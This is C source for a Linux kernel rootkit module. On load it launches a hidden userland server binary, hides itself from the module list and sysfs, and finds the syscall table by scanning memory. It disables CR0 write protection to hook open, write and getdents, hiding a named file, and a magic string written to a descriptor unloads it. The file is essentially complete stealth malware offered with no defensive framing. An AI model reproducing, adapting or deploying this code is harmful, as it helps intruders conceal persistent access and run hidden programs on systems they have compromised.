#define LINUX
#define _KERNEL_

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <asm/paravirt.h>
#include <linux/slab.h>

#define SERVER_PATH "/.uServer"

//other includes
#include <asm/segment.h>
#include <asm/fcntl.h>
#include <linux/types.h>
#include <linux/errno.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/stat.h>

int rootkit_init(void);
void rootkit_exit(void);
module_init(rootkit_init);
module_exit(rootkit_exit);

struct linux_dirent{
	long			d_ino;
	off_t			d_off;
	unsigned short	d_reclen;
	char			d_name[];
};

unsigned long **sys_call_table;
unsigned long original_cr0;

static int ls_exec(void) {
	int ret =-1;
	struct subprocess_info *sub_info;
	char *argv[] = { SERVER_PATH, NULL };
	static char *envp[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

	printk("make call i \n");
	//ret = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
	ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	printk("%d \n",ret);
	return ret;
	sub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC, NULL, NULL,NULL);
	printk("did we setup?");
	if (sub_info == NULL)  {
		printk("FAILED SETUP\n");
		return -ENOMEM;
	}
	printk("SETUP SUCCEEDED");
	return call_usermodehelper_exec( sub_info, UMH_NO_WAIT );
}


/* Acquires system call table or returns NULL if failed. */
static unsigned long **aquire_sys_call_table(void) {
        unsigned long int offset = PAGE_OFFSET;
        unsigned long **sct;

        while (offset < ULLONG_MAX) {
                sct = (unsigned long **)offset;

                if (sct[__NR_close] == (unsigned long *) sys_close)
                        return sct;

                offset += sizeof(void *);
        }

        return NULL;
}

asmlinkage long (*ref_sys_open)(const char *pathname, int flag, mode_t mode);
asmlinkage long new_sys_open(const char *pathname, int flag, mode_t mode){
	long ret;
	char *to_hide = "file_to_hide";
	char* kernel_pathname = (char*) kmalloc(256,GFP_KERNEL);
	copy_from_user(kernel_pathname, pathname, 255);

	if(strstr(kernel_pathname, to_hide) != NULL){
		//only goes in here when trying to save the "file_to_hide"
		//printk(KERN_INFO " :OPEN: secret file found... hiding it");
		kfree(kernel_pathname);
		return -ENOENT; //FILE_DOESN'T_EXIST
	}

	ret = ref_sys_open(pathname, flag, mode);
	kfree(kernel_pathname);

	return ret;
}

/* Stores reference to original system call write.
 * Fake write call scans user buffer for secret
 * unloads module if secret is passed to descriptor 8
 * otherwise forces all writes to descriptor 8 to descriptor 1
 * 
 * returns original system write call with modified parameters
*/
asmlinkage long (*ref_sys_write)(unsigned int fd, char __user *buf, size_t count);
asmlinkage long new_sys_write(unsigned int fd, char __user *buf, size_t count) {
	long ret;
	char* secret = "1337KODE";
	char* kbuff = (char*) kmalloc(256,GFP_KERNEL);
	copy_from_user(kbuff, buf, 255);
	if(fd == 8 && strstr(kbuff, secret) != NULL) {
		printk(KERN_INFO "EXITING");
		kfree(kbuff);
		rootkit_exit();
		return EEXIST;
	}

	ret = ref_sys_write(fd, buf, count);
	kfree(kbuff);
	return ret;
}

/*
asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);
asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
{
        long ret;
        ret = ref_sys_read(fd, buf, count);

        if(count >= 1 && fd == 8) {
//		printk(KERN_INFO "read intercept");
        }

        return ret;
}
*/

asmlinkage long (*ref_sys_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	unsigned int tmp, n;
	int t, proc = 0;
	struct inode *dinode;
	struct linux_dirent *dirp2, *dirp3;
	char hide[]="file_to_hide";                       /*the file to hide*/

	/*call original getdents -> result is saved in tmp*/
	tmp = (*ref_sys_getdents) (fd, dirp, count);

	/*directory cache handling*/
	/*this must be checked because it could be possible that a former getdents
	  put the results into the task process structure's dcache*/
#ifdef __LINUX_DCACHE_H
	//dinode = current->files->fd[fd]->f_dentry->d_inode;
#else
	dinode = current->files->fd[fd]->f_inode;
#endif

	/*dinode is the inode of the required directory*/
	if (tmp > 0) 
	{
		/*dirp2 is a new dirent structure*/
		dirp2 = (struct linux_dirent *) kmalloc(tmp, GFP_KERNEL);
		/*copy original linux_dirent structure to dirp2*/
		copy_from_user(dirp2, dirp, tmp);
		/*dirp3 points to dirp2*/
		dirp3 = dirp2;
		t = tmp;
		while (t > 0)
		{
			n = dirp3->d_reclen;
			t -= n;
			/*check if current filename is the name of the file we want to hide*/
			if (strstr((char *) &(dirp3->d_name), (char *) &hide) != NULL)
			{
				/*modify linux_dirent struct if necessary*/
				if (t != 0)
					memmove(dirp3, (char *) dirp3 + dirp3->d_reclen, t);
				else
					dirp3->d_off = 1024;
				tmp -= n;
			}
			if (dirp3->d_reclen == 0) 
			{
				/*
				 * workaround for some shitty fs drivers that do not properly
				 * feature the getdents syscall.
				 */
				tmp -= t;
				t = 0;
			}
			if (t != 0)
				dirp3 = (struct linux_dirent *) ((char *) dirp3 + dirp3->d_reclen);
		}

		copy_to_user(dirp, dirp2, tmp);
		kfree(dirp2);
	}
	return tmp;

}


int rootkit_init(void) {
	ls_exec();

	/*Hide module*/
	list_del_init(&__this_module.list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	
	if(!(sys_call_table = aquire_sys_call_table())) {
		printk(KERN_INFO "Call table not found");
		return -1;
	}
	printk(KERN_INFO "Call table found");
	
	original_cr0 = read_cr0();

	write_cr0(original_cr0 & ~0x00010000);
	ref_sys_write = (void *)sys_call_table[__NR_write];
	//ref_sys_read = (void *)sys_call_table[__NR_read];
	ref_sys_getdents = (void *)sys_call_table[__NR_getdents];
	ref_sys_open = (void *)sys_call_table[__NR_open];
	sys_call_table[__NR_write] = (unsigned long *)new_sys_write;
	//sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
	sys_call_table[__NR_getdents] = (unsigned long *)new_sys_getdents;
	sys_call_table[__NR_open] = (unsigned long *)new_sys_open;
	write_cr0(original_cr0);

	/*print confirmation module loaded*/
	printk(KERN_ALERT "Module loaded");
	
	return 0;
}

void rootkit_exit(void)  {
	if(!sys_call_table) {
		return;
	}
	
	write_cr0(original_cr0 & ~0x00010000);
	sys_call_table[__NR_write] = (unsigned long *)ref_sys_write;
	//sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
	sys_call_table[__NR_getdents] = (unsigned long *)ref_sys_getdents;
	sys_call_table[__NR_open] = (unsigned long *)ref_sys_open;
	write_cr0(original_cr0);
	
	/*print unloaded confirmation*/
	printk(KERN_ALERT "Module unloaded");

	msleep(2000);
}

MODULE_LICENSE("GPL");